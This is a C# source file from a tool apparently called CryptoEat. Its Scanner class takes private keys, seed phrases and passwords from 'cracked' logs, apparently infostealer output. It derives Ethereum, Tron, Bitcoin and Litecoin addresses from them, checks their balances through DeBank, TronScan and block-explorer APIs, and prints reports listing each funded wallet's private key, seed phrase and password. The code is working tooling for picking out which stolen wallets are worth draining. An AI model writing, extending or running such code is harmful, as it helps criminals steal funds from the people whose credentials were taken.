using System.Globalization;
using System.Runtime.CompilerServices;
using System.Text;
using CryptoEat.Modules.Logs.Models;
using CryptoEat.Modules.Scanners;
using CryptoEat.Modules.Wallet.Libs;
using Debank;
using HDWallet.Core;
using HDWallet.Tron;
using NBitcoin;
using NBitcoin.Altcoins;
using Nethereum.Util;
using Newtonsoft.Json;
using Pastel;

namespace CryptoEat.Modules.Logs
{
    internal class Scanner : IDisposable
    {
        private readonly HttpClient _cli = new();
        private readonly DeBank _scanner = new();
        private readonly TronScan _tronscan = new();

        public void Dispose()
        {
            _scanner.Dispose();
            _cli.Dispose();
            _tronscan.Dispose();
        }

        internal ScanResult Scan(Output account, string logPath, string pass, string prefix = "CRACKED")
        {
            var result = new ScanResult();

            var _privateKeysScan = new Dictionary<Nethereum.Web3.Accounts.Account, List<TokenList>>();
            var _mnemoScan = new Dictionary<Nethereum.Web3.Accounts.Account, List<TokenList>>();

            if (account.Accounts != null)
                _privateKeysScan = account.Accounts
                    .DistinctBy(x => x.PrivateKey)
                    .ToDictionary(account => account, account => _scanner.CachedGetTokens(account.Address))
                    .Where(x => x.Value != null)
                    .ToDictionary(x => x.Key, x => x.Value);
            ;

            if (account.Mnemonic != null)
                for (var i = 0; i < Generic.Settings.ScanDepth; i++)
                {
                    var acc = new Nethereum.HdWallet.Wallet(account.Mnemonic.ToString(), "").GetAccount(i);
                    _mnemoScan.Add(acc, _scanner.CachedGetTokens(acc.Address));
                }

            var newKeys = _mnemoScan.Concat(_privateKeysScan).DistinctBy(x => x.Key.PrivateKey)
                .ToDictionary(x => x.Key, x => x.Value);

            var tron = new List<(TronResult, string)>();

            if (account.Mnemonic != null)
            {
                #region Tron

                try
                {
                    IHDWallet<TronWallet> wallet = new TronHDWallet(account.Mnemonic.ToString());
                    var address = wallet.GetAccount(0).GetExternalWallet(0).Address;
                    var scanResult = _tronscan.CachedGetTokens(address);
                    tron.Add((scanResult, address));
                }
                catch (Exception ex)
                {
                    Generic.WriteError(ex);
                }

                #endregion
            }

            var tronBalance = tron.Sum(x => x.Item1.TotalAssetInUsd);

            try
            {
                result.TotalBalance = newKeys.Values.SelectMany(x => x).Sum(x => x.Amount * (x.Price ?? 0m)) +
                                      tronBalance;

                var sb = new StringBuilder();
                sb.AppendLine();
                sb.Append($"[{prefix.Pastel(Color.Red)}] ").AppendLine(new string('>', 49 - (prefix.Length + 1)));
                sb.Append("|=| TOTAL: [")
                    .Append(
                        Math.Round(result.TotalBalance, 2).ToString(CultureInfo.CurrentCulture)
                            .Pastel(Color.LightCoral))
                    .AppendLine("$]");
                if (account.Mnemonic != null)
                    sb.Append("|=| MNEMO: [").Append(account.Mnemonic.ToString().Pastel(Color.LightCoral))
                        .AppendLine("]");
                sb.Append("|=| PATH: [").Append(logPath.Pastel(Color.LightCoral)).AppendLine("]");
                if (!string.IsNullOrWhiteSpace(pass))
                    sb.Append("|=| PASSWORD: [").Append(pass.Pastel(Color.LightCoral)).AppendLine("]");

                foreach (var (acc, tokens) in newKeys)
                {
                    var total = tokens.Sum(x => x.Amount * (x.Price ?? 0m));
                    if (Math.Round(total, 1) == 0m) continue;

                    sb.AppendLine("|=| |=======================================|".Pastel(Color.Red));
                    sb.AppendLine($"|=| PRIVATE KEY: [{acc.PrivateKey.Pastel(Color.LightCoral)}]");
                    sb.Append(AddBalances(tokens));
                }

                if (Math.Round(tronBalance, 1) > 0m)
                    foreach (var (tronResult, adr) in tron)
                    {
                        if (Math.Round(tronResult.TotalAssetInUsd, 1) == 0m) continue;
                        sb.AppendLine("|=| |=======================================|".Pastel(Color.Red));
                        sb.AppendLine($"|=| TRON ADDRESS: [{adr}]");
                        sb.AppendLine($"|=| TRON SUMMARY: [{Math.Round(tronResult.TotalAssetInUsd, 2)}$]");
                        sb.AppendLine($"|=| TRON ASSETS: [{tronResult.TotalTokenCount}]");
                    }

                if (account.Mnemonic != null)
                {
                    #region Bitcoin

                    try
                    {
                        var address = GetAddress(account.Mnemonic, NBitcoin.Network.Main);
                        var balance = GetBitcoin(address);

                        if (balance.Balance != "0" || balance.TotalReceived != "0")
                        {
                            sb.AppendLine("|=| |=======================================|".Pastel(Color.Red));
                            sb.AppendLine($"|=| BITCOIN: [{balance.Balance.Pastel(Color.LightCoral)} BTC]");
                            sb.AppendLine(
                                $"|=| TOTAL RECIVIED: [{balance.TotalReceived.Pastel(Color.LightCoral)} BTC]");
                        }
                    }
                    catch (Exception ex)
                    {
                        Generic.WriteError(ex);
                    }

                    #endregion

                    #region Litecoin

                    try
                    {
                        var address = GetAddress(account.Mnemonic, Litecoin.Instance.Mainnet, "m/84'/2'/0'/0/0");
                        var balance = GetLitecoin(address);

                        if (balance.Balance != "0" || balance.TotalReceived != "0")
                        {
                            sb.AppendLine("|=| |=======================================|".Pastel(Color.Red));
                            sb.AppendLine($"|=| LITECOIN: [{balance.Balance.Pastel(Color.LightCoral)} LTC]");
                            sb.AppendLine(
                                $"|=| TOTAL RECIVIED: [{balance.TotalReceived.Pastel(Color.LightCoral)} LTC]");
                        }
                    }
                    catch (Exception ex)
                    {
                        Generic.WriteError(ex);
                    }

                    #endregion
                }

                sb.AppendLine("=================================================");

                result.LogResult = sb.ToString();
            }
            catch (Exception ex)
            {
                Generic.WriteError(ex);
            }

            return result;
        }

        private static StringBuilder AddBalances(IEnumerable<TokenList> tokens)
        {
            var sb = new StringBuilder();
            var balances = tokens
                .Select(z => new
                {
                    Raw = (BigDecimal)z.Amount,
                    Balance = Math.Round(z.Amount * (z.Price ?? 0m), 2),
                    BalanceWoRound = z.Amount * (z.Price ?? 0m),
                    Token = z.Symbol?.ToUpper(),
                    IsWallet = z.Id == z.Chain,
                    Contract = z.Id,
                    z.Chain,
                    IsScam = !z.IsVerified
                })
                .Where(b => b.Balance > 0m && !b.IsScam)
                .OrderByDescending(t => t.Balance)
                .ToList();

            foreach (var balance in balances.Where(b => b.IsWallet))
                sb.Append("|==| CORE: ")
                    .Append(balance.Balance.ToString(CultureInfo.CurrentCulture).Pastel(Color.LightCoral)).Append("$ [")
                    .Append(balance.Raw.ToString().Pastel(Color.LightCoral)).Append(' ')
                    .Append(balance.Token.Pastel(Color.Coral)).AppendLine("]");
            foreach (var balance in balances.Where(b => !b.IsWallet))
                sb.Append("|==| TOKEN [")
                    .Append(balance.Chain?.ToUpper().Pastel(Color.Coral)).Append("]: ")
                    .Append(balance.Balance.ToString(CultureInfo.CurrentCulture).Pastel(Color.LightCoral)).Append("$ [")
                    .Append(balance.Raw.ToString().Pastel(Color.LightCoral)).Append(' ')
                    .Append(balance.Token.Pastel(Color.Coral)).AppendLine("]");

            return sb;
        }

        internal static ScanResult ScanMulti(List<Account> accounts, string logPath, bool skipHardware = true)
        {
            using var debank = new DeBank();
            var result = new ScanResult();
            var resp = accounts
                .DistinctBy(x => x.Address)
                .ToDictionary(account => account, account => debank.CachedGetTokens(account.Address))
                .Where(x => x.Value != null)
                .ToDictionary(x => x.Key, x => x.Value);

            if (!resp.Values.Where(x => x != null).SelectMany(x => x!).Any()) return result;

            try
            {
                if (skipHardware)
                    result.TotalBalance =
                        resp.Where(x => x.Key.HardwareWallet == null).SelectMany(x => x.Value)
                            .Sum(x => x.Amount * (x.Price ?? 0m));
                else
                    result.TotalBalance =
                        resp.Values.SelectMany(x => x).Sum(x => x.Amount * (x.Price ?? 0m));

                if (result.TotalBalance == 0m) return result;

                var sb = new StringBuilder();
                sb.AppendLine();
                sb.AppendLine("=================================================");
                sb.Append("|=| TOTAL: [")
                    .Append(
                        Math.Round(result.TotalBalance, 2).ToString(CultureInfo.CurrentCulture)
                            .Pastel(Color.LightCoral))
                    .AppendLine("$]");
                sb.Append("|=| PATH: [").Append(logPath.Pastel(Color.LightCoral)).AppendLine("]");

                foreach (var (account, tokenList) in resp)
                {
                    var total = tokenList.Sum(x => x.Amount * (x.Price ?? 0m));
                    if (Math.Round(total, 1) == 0m) continue;

                    sb.AppendLine("|=| |=======================================|");
                    sb.Append("|=| ADDRESS: [").Append(account.Address.Pastel(Color.LightCoral)).AppendLine("]");
                    if (account.HardwareWallet != null)
                        sb.AppendLine($"|=| [{account.HardwareWallet.ToUpper().Pastel(Color.Red)}]");
                    sb.AppendLine("|=| |=======================================|");

                    sb.Append(AddBalances(tokenList));
                }

                sb.AppendLine("=================================================");

                result.LogResult = sb.ToString();
            }
            catch (Exception ex)
            {
                Generic.WriteError(ex);
            }

            return result;
        }

        #region INLINED

        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        private static string GetAddress(Mnemonic mnemo, NBitcoin.Network network, string path = "m/84'/0'/0'/0/0")
        {
            var masterKey = mnemo.DeriveExtKey();
            var key = masterKey.Derive(KeyPath.Parse(path)).PrivateKey;
            return key.PubKey.GetAddress(ScriptPubKeyType.Segwit, network).ToString();
        }

        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        private BlockExplorerResp GetBitcoin(string adr)
        {
            return JsonConvert.DeserializeObject<BlockExplorerResp>(_cli
                .GetStringAsync($"https://bitcoinblockexplorers.com/api/address/{adr}").Result)!;
        }

        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        private BlockExplorerResp GetLitecoin(string adr)
        {
            return JsonConvert.DeserializeObject<BlockExplorerResp>(_cli
                .GetStringAsync($"https://litecoinblockexplorer.net/api/address/{adr}").Result)!;
        }

        #endregion
    }

    internal class ScanResult
    {
        internal string? LogResult = "";
        internal decimal TotalBalance;
    }
}

namespace CryptoEat.Modules.Logs.Models
{
    public class BlockExplorerResp
    {
        [JsonProperty("page")] public long Page { get; set; }

        [JsonProperty("totalPages")] public long TotalPages { get; set; }

        [JsonProperty("itemsOnPage")] public long ItemsOnPage { get; set; }

        [JsonProperty("addrStr")] public string AddrStr { get; set; }

        [JsonProperty("balance")] public string Balance { get; set; }

        [JsonProperty("totalReceived")] public string TotalReceived { get; set; }

        [JsonProperty("totalSent")] public string TotalSent { get; set; }

        [JsonProperty("unconfirmedBalance")] public string UnconfirmedBalance { get; set; }

        [JsonProperty("unconfirmedTxApperances")]
        public long UnconfirmedTxApperances { get; set; }

        [JsonProperty("txApperances")] public long TxApperances { get; set; }
    }
}